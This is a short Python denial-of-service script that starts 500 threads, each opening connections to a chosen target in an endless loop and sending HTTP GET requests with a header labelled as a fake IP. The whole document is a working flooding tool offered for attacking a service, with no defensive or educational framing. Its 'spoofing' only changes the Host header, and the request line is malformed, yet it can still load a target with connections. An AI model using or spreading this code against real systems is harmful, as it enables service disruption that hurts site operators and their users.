import threading
import socket
target = '' #IP or Domain name
port = 80 #depends on service you're attacking
fake_ip = '182.21.20.32'
def attack():
    while True:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #socket.AF_INET creates an internet socket,socket.SOCK_STREAM specifies the protocol
        s.connect((target,port))
        s.sendto(("GET /"+target+"HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode("ascii"),(target,port))
        s.close()
for i in range(500):
    thread=threading.Thread(target=attack)
    thread.start()
    
